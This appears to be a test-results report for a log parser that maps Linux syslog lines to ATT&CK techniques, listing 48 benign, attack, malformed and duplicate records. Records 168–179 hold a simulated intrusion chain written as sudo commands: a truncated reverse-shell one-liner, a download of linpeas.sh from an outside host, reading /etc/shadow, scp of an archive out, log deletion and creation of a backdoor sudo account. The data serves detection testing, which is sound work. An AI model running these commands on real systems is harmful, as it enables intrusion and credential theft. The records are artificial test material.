# Family: Linux

All records whose expected family is `Linux`.

_family=Linux, size=48_

| # | Family | Subtype | Intent | Expected | Actual | Severity | Source | Failing | Triage |
|---:|---|---|---|---|---|---|---|---|---|
| 144 | Linux | Syslog | Benign | — | — | info | none | — | — |
| 145 | Linux | Syslog | Benign | — | — | info | none | `subtype_match` | `heuristic_limit` |
| 146 | Linux | Syslog | Benign | — | — | info | none | — | — |
| 147 | Linux | Syslog | Benign | — | — | info | none | `subtype_match` | `heuristic_limit` |
| 148 | Linux | Syslog | Benign | — | — | info | none | `subtype_match` | `heuristic_limit` |
| 149 | Linux | Syslog | Benign | — | — | info | none | — | — |
| 150 | Linux | Syslog | Benign | — | — | info | none | — | — |
| 151 | Linux | Syslog | Benign | — | — | info | none | `subtype_match` | `heuristic_limit` |
| 152 | Linux | Syslog | Benign | — | — | info | none | `subtype_match` | `heuristic_limit` |
| 153 | Linux | Syslog | Benign | — | — | info | none | — | — |
| 154 | Linux | Syslog | Benign | — | — | info | none | — | — |
| 155 | Linux | Syslog | Benign | — | — | info | none | `subtype_match` | `heuristic_limit` |
| 156 | Linux | Syslog sshd | Suspicious | `T1110.001` | `T1110` | medium | rule | — | — |
| 157 | Linux | Syslog sshd | Suspicious | `T1110.001` | `T1110` | medium | rule | — | — |
| 158 | Linux | Syslog sshd | Suspicious | `T1110.001` | `T1110` | medium | rule | — | — |
| 159 | Linux | Syslog sshd | Suspicious | `T1110.001` | `T1110` | medium | rule | — | — |
| 160 | Linux | Syslog sshd | Suspicious | `T1110.001` | `T1110` | medium | rule | — | — |
| 161 | Linux | Syslog sshd | Suspicious | `T1110.001` | `T1110` | medium | rule | — | — |
| 162 | Linux | Syslog sshd | Suspicious | `T1110.001` | `T1110` | medium | rule | — | — |
| 163 | Linux | Syslog sshd | Suspicious | `T1110.001` | `T1110` | medium | rule | — | — |
| 164 | Linux | Syslog sshd | Suspicious | `T1110.001` | `T1110` | medium | rule | — | — |
| 165 | Linux | Syslog sshd | Suspicious | `T1110.001` | `T1110` | medium | rule | — | — |
| 166 | Linux | Syslog sshd | Suspicious | `T1110.001` | `T1110` | medium | rule | — | — |
| 167 | Linux | Syslog sshd | Suspicious | `T1110.001` | `T1110` | medium | rule | — | — |
| 168 | Linux | Syslog sshd | Malicious | `T1078.003` | `T1078` | medium | rule | — | — |
| 169 | Linux | Syslog sudo | Malicious | `T1059.004` | `T1059` | high | rule | — | — |
| 170 | Linux | Syslog sudo | Malicious | `T1105` | `T1105` | medium | rule | — | — |
| 171 | Linux | Syslog sudo | Malicious | `T1059.004` | `T1059` | medium | rule | — | — |
| 172 | Linux | Syslog sudo | Malicious | `T1053.003` | `T1053` | high | rule | — | — |
| 173 | Linux | Syslog sudo | Malicious | `T1003.008` | `T1003` | critical | rule | — | — |
| 174 | Linux | Syslog sudo | Malicious | `T1552.004` | `T1552` | medium | rule | — | — |
| 175 | Linux | Syslog sudo | Malicious | `T1048.002` | `T1048` | medium | rule | — | — |
| 176 | Linux | Syslog sudo | Malicious | `T1070.002` | `T1070` | high | rule | — | — |
| 177 | Linux | Syslog sudo | Malicious | `T1552.001` | `T1552` | medium | rule | — | — |
| 178 | Linux | Syslog sudo | Malicious | `T1136.001` | `T1136` | medium | rule | — | — |
| 179 | Linux | Syslog sudo | Malicious | `T1098` | `T1098` | medium | rule | — | — |
| 180 | Linux | Syslog | Malformed | — | — | info | none | `family_match`, `subtype_match` | `heuristic_limit` |
| 181 | Linux | Syslog | Malformed | — | — | info | none | — | — |
| 182 | Linux | Syslog | Malformed | — | — | info | none | — | — |
| 183 | Linux | Syslog | Malformed | — | — | info | none | — | — |
| 184 | Linux | Syslog sshd | Duplicate | — | `T1078` | medium | rule | `attack_mapping_presence` | `expected_label_conflict` |
| 185 | Linux | Syslog sshd | Duplicate | — | `T1078` | medium | rule | `attack_mapping_presence` | `expected_label_conflict` |
| 186 | Linux | Syslog sshd | Duplicate | — | `T1078` | medium | rule | `attack_mapping_presence` | `expected_label_conflict` |
| 187 | Linux | Syslog sshd | Duplicate | — | `T1078` | medium | rule | `attack_mapping_presence` | `expected_label_conflict` |
| 188 | Linux | Syslog | Mixed | — | `T1078` | medium | rule | `subtype_match`, `attack_mapping_presence` | `corpus_ambiguity`, `heuristic_limit` |
| 189 | Linux | Syslog | Mixed | `T1040` | `T1040` | medium | rule | `subtype_match` | `heuristic_limit` |
| 190 | Linux | Syslog | Mixed | `T1548.001` | `T1548` | medium | rule | `subtype_match` | `heuristic_limit` |
| 191 | Linux | Syslog | Mixed | — | — | info | none | — | — |

## Records

### Record 144

- Family / subtype: `Linux` / `Syslog`
- Intent: `Benign`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 4 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
Apr 18 03:00:01 srv-linux-01 CRON[3012]: (root) CMD (run-parts /etc/cron.hourly)
```

### Record 145

- Family / subtype: `Linux` / `Syslog`
- Intent: `Benign`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Failing assertions: `subtype_match`
- Triage: `heuristic_limit`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 5 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
Apr 18 03:00:05 srv-linux-01 sshd[3015]: Connection closed by authenticating user j.doe 10.10.25.10 port 51222 [preauth]
```

### Record 146

- Family / subtype: `Linux` / `Syslog`
- Intent: `Benign`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 4 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
Apr 18 03:00:10 srv-linux-01 systemd[1]: Started Session 122 of user j.doe.
```

### Record 147

- Family / subtype: `Linux` / `Syslog`
- Intent: `Benign`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Failing assertions: `subtype_match`
- Triage: `heuristic_limit`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 7 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
Apr 18 03:00:15 srv-linux-01 sudo:    j.doe : TTY=pts/0 ; PWD=/home/j.doe ; USER=root ; COMMAND=/usr/bin/apt update
```

### Record 148

- Family / subtype: `Linux` / `Syslog`
- Intent: `Benign`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Failing assertions: `subtype_match`
- Triage: `heuristic_limit`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 5 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
Apr 18 03:00:20 srv-linux-01 sshd[3020]: Accepted publickey for j.doe from 10.10.25.10 port 51223 ssh2: RSA SHA256:abc
```

### Record 149

- Family / subtype: `Linux` / `Syslog`
- Intent: `Benign`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 4 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
Apr 18 03:00:25 srv-linux-01 CRON[3025]: (j.doe) CMD (/home/j.doe/scripts/cleanup.sh)
```

### Record 150

- Family / subtype: `Linux` / `Syslog`
- Intent: `Benign`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 3 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
Apr 18 03:00:30 srv-linux-01 systemd[1]: Stopping System Logging Service...
```

### Record 151

- Family / subtype: `Linux` / `Syslog`
- Intent: `Benign`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Failing assertions: `subtype_match`
- Triage: `heuristic_limit`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 5 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
Apr 18 03:00:35 srv-linux-01 sshd[3030]: pam_unix(sshd:session): session opened for user j.doe by (uid=0)
```

### Record 152

- Family / subtype: `Linux` / `Syslog`
- Intent: `Benign`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Failing assertions: `subtype_match`
- Triage: `heuristic_limit`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 7 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
Apr 18 03:00:40 srv-linux-01 sudo:    j.doe : TTY=pts/0 ; PWD=/home/j.doe ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
```

### Record 153

- Family / subtype: `Linux` / `Syslog`
- Intent: `Benign`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 4 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
Apr 18 03:00:45 srv-linux-01 CRON[3040]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
```

### Record 154

- Family / subtype: `Linux` / `Syslog`
- Intent: `Benign`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 3 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
Apr 18 03:00:50 srv-linux-01 systemd[1]: Starting Rotate log files...
```

### Record 155

- Family / subtype: `Linux` / `Syslog`
- Intent: `Benign`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Failing assertions: `subtype_match`
- Triage: `heuristic_limit`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 5 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
Apr 18 03:00:55 srv-linux-01 sshd[3050]: pam_unix(sshd:session): session closed for user j.doe
```

### Record 156

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Suspicious`
- Expected technique: `T1110.001` — actual: `T1110`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1110` (Brute Force) via rule at confidence 0.7. Parser extracted 7 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:05:00 srv-linux-01 sshd[4010]: Invalid user support from 198.51.100.45 port 53100
```

### Record 157

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Suspicious`
- Expected technique: `T1110.001` — actual: `T1110`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1110` (Brute Force) via rule at confidence 0.7. Parser extracted 7 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:05:05 srv-linux-01 sshd[4011]: Invalid user admin from 198.51.100.45 port 53102
```

### Record 158

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Suspicious`
- Expected technique: `T1110.001` — actual: `T1110`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1110` (Brute Force) via rule at confidence 0.7. Parser extracted 7 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:05:10 srv-linux-01 sshd[4012]: Invalid user test from 198.51.100.45 port 53104
```

### Record 159

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Suspicious`
- Expected technique: `T1110.001` — actual: `T1110`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1110` (Brute Force) via rule at confidence 0.7. Parser extracted 7 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:05:15 srv-linux-01 sshd[4013]: Invalid user user from 198.51.100.45 port 53106
```

### Record 160

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Suspicious`
- Expected technique: `T1110.001` — actual: `T1110`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1110` (Brute Force) via rule at confidence 0.7. Parser extracted 7 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:05:20 srv-linux-01 sshd[4014]: Invalid user oracle from 198.51.100.45 port 53108
```

### Record 161

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Suspicious`
- Expected technique: `T1110.001` — actual: `T1110`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1110` (Brute Force) via rule at confidence 0.7. Parser extracted 7 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:05:25 srv-linux-01 sshd[4015]: Invalid user mysql from 198.51.100.45 port 53110
```

### Record 162

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Suspicious`
- Expected technique: `T1110.001` — actual: `T1110`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1110` (Brute Force) via rule at confidence 0.7. Parser extracted 7 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:05:30 srv-linux-01 sshd[4016]: Invalid user deployment from 198.51.100.45 port 53112
```

### Record 163

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Suspicious`
- Expected technique: `T1110.001` — actual: `T1110`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1110` (Brute Force) via rule at confidence 0.7. Parser extracted 7 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:05:35 srv-linux-01 sshd[4017]: Invalid user backup from 198.51.100.45 port 53114
```

### Record 164

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Suspicious`
- Expected technique: `T1110.001` — actual: `T1110`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1110` (Brute Force) via rule at confidence 0.7. Parser extracted 7 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:05:40 srv-linux-01 sshd[4018]: Invalid user dev from 198.51.100.45 port 53116
```

### Record 165

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Suspicious`
- Expected technique: `T1110.001` — actual: `T1110`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1110` (Brute Force) via rule at confidence 0.7. Parser extracted 7 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:05:45 srv-linux-01 sshd[4019]: Invalid user prod from 198.51.100.45 port 53118
```

### Record 166

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Suspicious`
- Expected technique: `T1110.001` — actual: `T1110`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1110` (Brute Force) via rule at confidence 0.7. Parser extracted 7 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:05:50 srv-linux-01 sshd[4020]: Invalid user ubuntu from 198.51.100.45 port 53120
```

### Record 167

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Suspicious`
- Expected technique: `T1110.001` — actual: `T1110`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1110` (Brute Force) via rule at confidence 0.7. Parser extracted 7 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:05:55 srv-linux-01 sshd[4021]: Invalid user webmaster from 198.51.100.45 port 53122
```

### Record 168

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Malicious`
- Expected technique: `T1078.003` — actual: `T1078`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1078` (Valid Accounts) via rule at confidence 0.7. Parser extracted 6 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:10:00 srv-linux-01 sshd[5010]: Accepted password for root from 198.51.100.45 port 54100 ssh2
```

### Record 169

- Family / subtype: `Linux` / `Syslog sudo`
- Intent: `Malicious`
- Expected technique: `T1059.004` — actual: `T1059`
- Severity: `high` — mapping source: `rule`
- Outcome: Mapped to `T1059` (Command and Scripting Interpreter) via rule at confidence 0.85. Parser extracted 8 normalized field(s); 1 mapping evidence ref(s); severity `high`.

```
Apr 18 03:10:05 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/python3 -c 'import socket,os,pty;s=sock...
```

### Record 170

- Family / subtype: `Linux` / `Syslog sudo`
- Intent: `Malicious`
- Expected technique: `T1105` — actual: `T1105`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1105` (Ingress Tool Transfer) via rule at confidence 0.85. Parser extracted 8 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:10:10 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://198.51.100.150/linpeas.sh -...
```

### Record 171

- Family / subtype: `Linux` / `Syslog sudo`
- Intent: `Malicious`
- Expected technique: `T1059.004` — actual: `T1059`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1059` (Command and Scripting Interpreter) via rule at confidence 0.72. Parser extracted 7 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:10:15 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash /tmp/lp.sh
```

### Record 172

- Family / subtype: `Linux` / `Syslog sudo`
- Intent: `Malicious`
- Expected technique: `T1053.003` — actual: `T1053`
- Severity: `high` — mapping source: `rule`
- Outcome: Mapped to `T1053` (Scheduled Task/Job) via rule at confidence 0.8. Parser extracted 6 normalized field(s); 1 mapping evidence ref(s); severity `high`.

```
Apr 18 03:10:20 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/crontab -e
```

### Record 173

- Family / subtype: `Linux` / `Syslog sudo`
- Intent: `Malicious`
- Expected technique: `T1003.008` — actual: `T1003`
- Severity: `critical` — mapping source: `rule`
- Outcome: Mapped to `T1003` (OS Credential Dumping) via rule at confidence 0.85. Parser extracted 6 normalized field(s); 1 mapping evidence ref(s); severity `critical`.

```
Apr 18 03:10:25 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
```

### Record 174

- Family / subtype: `Linux` / `Syslog sudo`
- Intent: `Malicious`
- Expected technique: `T1552.004` — actual: `T1552`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1552` (Unsecured Credentials) via rule at confidence 0.8. Parser extracted 7 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:10:30 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/backup.tar.gz /home/j.doe...
```

### Record 175

- Family / subtype: `Linux` / `Syslog sudo`
- Intent: `Malicious`
- Expected technique: `T1048.002` — actual: `T1048`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1048` (Exfiltration Over Alternative Protocol) via rule at confidence 0.82. Parser extracted 8 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:10:35 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/scp /tmp/backup.tar.gz root@198.51.100....
```

### Record 176

- Family / subtype: `Linux` / `Syslog sudo`
- Intent: `Malicious`
- Expected technique: `T1070.002` — actual: `T1070`
- Severity: `high` — mapping source: `rule`
- Outcome: Mapped to `T1070` (Indicator Removal) via rule at confidence 0.88. Parser extracted 6 normalized field(s); 1 mapping evidence ref(s); severity `high`.

```
Apr 18 03:10:40 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/rm -rf /var/log/.log
```

### Record 177

- Family / subtype: `Linux` / `Syslog sudo`
- Intent: `Malicious`
- Expected technique: `T1552.001` — actual: `T1552`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1552` (Unsecured Credentials) via rule at confidence 0.8. Parser extracted 6 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:10:45 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/find / -name '*.conf' -exec grep -i 'pa...
```

### Record 178

- Family / subtype: `Linux` / `Syslog sudo`
- Intent: `Malicious`
- Expected technique: `T1136.001` — actual: `T1136`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1136` (Create Account) via rule at confidence 0.8. Parser extracted 6 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:10:50 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/useradd -m -p '$1$abc$def' backup_user
```

### Record 179

- Family / subtype: `Linux` / `Syslog sudo`
- Intent: `Malicious`
- Expected technique: `T1098` — actual: `T1098`
- Severity: `medium` — mapping source: `rule`
- Outcome: Mapped to `T1098` (Account Manipulation) via rule at confidence 0.82. Parser extracted 6 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:10:55 srv-linux-01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo backup_user
```

### Record 180

- Family / subtype: `Linux` / `Syslog`
- Intent: `Malformed`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Failing assertions: `family_match`, `subtype_match`
- Triage: `heuristic_limit`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 0 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
Apr 18 03:45:00 srv-linux-01 : %LOG_SYSTEM_FAILURE% error_code=0xDEADBEEF
```

### Record 181

- Family / subtype: `Linux` / `Syslog`
- Intent: `Malformed`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 0 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
Apr 99 77:77:77 badhost sshd[]: Accepted password for ??? from 999.999.999.999 port -1
```

### Record 182

- Family / subtype: `Linux` / `Syslog`
- Intent: `Malformed`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 1 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
srv-linux-01 sudo root COMMAND=/bin/bash
```

### Record 183

- Family / subtype: `Linux` / `Syslog`
- Intent: `Malformed`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 0 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
Apr 18 03:45:15 sshd[abc]: Invalid user from port ssh2
```

### Record 184

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Duplicate`
- Expected technique: — — actual: `T1078`
- Severity: `medium` — mapping source: `rule`
- Failing assertions: `attack_mapping_presence`
- Triage: `expected_label_conflict`
- Outcome: Mapped to `T1078` (Valid Accounts) via rule at confidence 0.7. Parser extracted 6 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:10:00 srv-linux-01 sshd[5010]: Accepted password for root from 198.51.100.45 port 54100 ssh2
```

### Record 185

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Duplicate`
- Expected technique: — — actual: `T1078`
- Severity: `medium` — mapping source: `rule`
- Failing assertions: `attack_mapping_presence`
- Triage: `expected_label_conflict`
- Outcome: Mapped to `T1078` (Valid Accounts) via rule at confidence 0.7. Parser extracted 6 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:10:00 srv-linux-01 sshd[5010]: Accepted password for root from 198.51.100.45 port 54100 ssh2
```

### Record 186

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Duplicate`
- Expected technique: — — actual: `T1078`
- Severity: `medium` — mapping source: `rule`
- Failing assertions: `attack_mapping_presence`
- Triage: `expected_label_conflict`
- Outcome: Mapped to `T1078` (Valid Accounts) via rule at confidence 0.7. Parser extracted 6 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:10:00 srv-linux-01 sshd[5010]: Accepted password for root from 198.51.100.45 port 54100 ssh2
```

### Record 187

- Family / subtype: `Linux` / `Syslog sshd`
- Intent: `Duplicate`
- Expected technique: — — actual: `T1078`
- Severity: `medium` — mapping source: `rule`
- Failing assertions: `attack_mapping_presence`
- Triage: `expected_label_conflict`
- Outcome: Mapped to `T1078` (Valid Accounts) via rule at confidence 0.7. Parser extracted 6 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:10:00 srv-linux-01 sshd[5010]: Accepted password for root from 198.51.100.45 port 54100 ssh2
```

### Record 188

- Family / subtype: `Linux` / `Syslog`
- Intent: `Mixed`
- Expected technique: — — actual: `T1078`
- Severity: `medium` — mapping source: `rule`
- Failing assertions: `subtype_match`, `attack_mapping_presence`
- Triage: `corpus_ambiguity`, `heuristic_limit`
- Outcome: Mapped to `T1078` (Valid Accounts) via rule at confidence 0.7. Parser extracted 6 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:20:00 srv-linux-01 sshd[6020]: Accepted password for root from 10.10.1.10 port 55105 ssh2
```

### Record 189

- Family / subtype: `Linux` / `Syslog`
- Intent: `Mixed`
- Expected technique: `T1040` — actual: `T1040`
- Severity: `medium` — mapping source: `rule`
- Failing assertions: `subtype_match`
- Triage: `heuristic_limit`
- Outcome: Mapped to `T1040` (Network Sniffing) via rule at confidence 0.78. Parser extracted 7 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:20:10 srv-linux-01 sudo:    j.doe : TTY=pts/0 ; PWD=/home/j.doe ; USER=root ; COMMAND=/usr/bin/tcpdump -i eth0 -w /tmp/out.pcap
```

### Record 190

- Family / subtype: `Linux` / `Syslog`
- Intent: `Mixed`
- Expected technique: `T1548.001` — actual: `T1548`
- Severity: `medium` — mapping source: `rule`
- Failing assertions: `subtype_match`
- Triage: `heuristic_limit`
- Outcome: Mapped to `T1548` (Abuse Elevation Control Mechanism) via rule at confidence 0.75. Parser extracted 6 normalized field(s); 1 mapping evidence ref(s); severity `medium`.

```
Apr 18 03:20:20 srv-linux-01 sudo:    deploy : TTY=pts/1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/find / -perm -4000
```

### Record 191

- Family / subtype: `Linux` / `Syslog`
- Intent: `Mixed`
- Expected technique: — — actual: —
- Severity: `info` — mapping source: `none`
- Outcome: No ATT&CK mapping produced for this Linux log; handled gracefully as `no_mapping`. Parser extracted 3 normalized field(s); 0 mapping evidence ref(s); severity `info`.

```
Apr 18 03:20:30 srv-linux-01 CRON[7001]: (root) CMD (command -v debian-dist-upgrade >/dev/null 2>&1 || exit 0)
```

